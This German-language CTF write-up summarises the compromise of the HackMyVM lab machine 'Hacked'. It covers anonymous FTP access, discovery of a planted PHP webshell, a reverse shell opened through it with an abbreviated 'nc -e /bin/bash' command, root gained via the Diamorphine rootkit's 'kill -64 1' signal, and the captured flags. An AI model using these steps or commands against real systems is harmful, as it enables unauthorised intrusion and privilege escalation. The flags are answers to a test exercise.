# Hacked - HackMyVM (Hard) - Writeup

![Hacked Icon](Hacked.png)

Dieses Repository enthält einen zusammengefassten Bericht über die Kompromittierung der HackMyVM-Maschine "Hacked" (Schwierigkeitsgrad: Hard).

## Metadaten

*   **Maschine:** Hacked (HackMyVM - Hard)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Hacked](https://hackmyvm.eu/machines/machine.php?vm=Hacked)
*   **Autor des Writeups:** DarkSpirit
*   **Datum:** 18. Oktober 2022
*   **Original Writeup:** [https://alientec1908.github.io/Hacked_HackMyVM_Hard/](https://alientec1908.github.io/Hacked_HackMyVM_Hard/)

## Zusammenfassung des Angriffspfads

Die initiale Erkundung mit `nmap` offenbarte einen FTP-Dienst (Port 21, vsftpd) mit erlaubtem anonymen Login, einen SSH-Dienst (Port 22) und einen Nginx-Webserver (Port 80). Über den anonymen FTP-Zugriff wurde eine `flag.txt` (Flag 1) und eine versteckte Datei `.passwd` heruntergeladen, die das Klartext-Passwort `webserver2023!` enthielt.

Die Web-Enumeration auf Port 80 (nachdem der Hostname `hack.hmv` in `/etc/hosts` eingetragen wurde) führte über `robots.txt` zur Datei `/secretnote.txt`. Diese Notiz von "h4x0r" enthielt den Hinweis, dass eine Webshell installiert sei. Ein `gobuster`-Scan mit einer Webshell-Liste fand `/simple-backdoor.php`. Mittels `wfuzz` wurde der GET-Parameter `secret` für diese Webshell identifiziert.

Durch Ausnutzung der Webshell (`simple-backdoor.php?secret=[Befehl]`) wurde Remote Code Execution (RCE) erlangt und eine Reverse Shell als Benutzer `www-data` etabliert.

Die lokale Enumeration als `www-data` deckte durch Vergleich der Kernelmodule (`ls /sys/module/`) das Vorhandensein des `Diamorphine`-Rootkits auf. Durch Senden des Signals 64 an PID 1 (`kill -64 1`) wurden Root-Rechte erlangt. Anschließend wurden die User-Flag im Home-Verzeichnis von `h4x0r` und die Root-Flag im `/root`-Verzeichnis ausgelesen.

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `vi` / Editor
*   `nmap`
*   `ftp`
*   `cat`
*   `gobuster`
*   `curl`
*   `wfuzz`
*   `nc` (netcat)
*   `python3` (`pty` module)
*   `stty`
*   `ls`
*   `grep`
*   `kill`
*   `id`
*   `cd`

## Angriffsschritte (Übersicht)

1.  **Reconnaissance:** Ziel-IP (`arp-scan`), Hostname (`hack.hmv` in `/etc/hosts`). `nmap` -> Port 21 (FTP, anon), Port 22 (SSH), Port 80 (HTTP/Nginx).
2.  **FTP Enumeration & Credential Discovery:** Anonymer Login (`ftp`). `get flag.txt` (Flag 1). `ls -la` -> `.passwd` finden. `get .passwd` -> Passwort `webserver2023!`.
3.  **Web Enumeration:** `gobuster` (findet `robots.txt`). `curl robots.txt` -> `/secretnote.txt`. `curl /secretnote.txt` -> Hinweis auf Webshell von "h4x0r".
4.  **Webshell Discovery:** `gobuster` mit Webshell-Liste (`backdoor_list.txt`) -> `/simple-backdoor.php`.
5.  **Parameter Fuzzing:** `wfuzz` auf `simple-backdoor.php` -> GET-Parameter `secret` gefunden.
6.  **Initial Access (Webshell RCE):** RCE via `curl ".../simple-backdoor.php?secret=id"` bestätigt. `nc`-Listener starten. Reverse Shell mit `curl ".../simple-backdoor.php?secret=nc -e /bin/bash..."` -> Shell als `www-data`. Stabilisieren (`python pty`, `stty`).
7.  **Privilege Escalation Vector:** Kernelmodule auflisten und vergleichen (`ls /sys/module/ ...`) -> `Diamorphine` Rootkit identifiziert.
8.  **Root Access:** `kill -64 1` ausführen -> `uid=0(root)`.
9.  **Flags:** User-Flag (`cat /home/h4x0r/user.txt`) und Root-Flag (`cat /root/root.txt`) lesen.

## Flags

*   **Flag 1 (FTP):** `HMV{AN0NYM0US_IS_THE_BEST_USER}`
*   **User Flag (`/home/h4x0r/user.txt`):** `HMVimthabesthacker`
*   **Root Flag (`/root/root.txt`):** `HMVhackingthehacker`

---

## Disclaimer

Die hier dargestellten Informationen und Techniken dienen ausschließlich Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Methoden dürfen nur auf Systemen angewendet werden, für die eine ausdrückliche Genehmigung vorliegt (z.B. in CTF-Umgebungen wie HackMyVM, Penetrationstests mit schriftlicher Erlaubnis). Das unbefugte Eindringen in fremde Computersysteme ist illegal und strafbar. Die Autoren übernehmen keine Haftung für missbräuchliche Verwendung der bereitgestellten Informationen. Handeln Sie stets legal und ethisch verantwortlich.

---
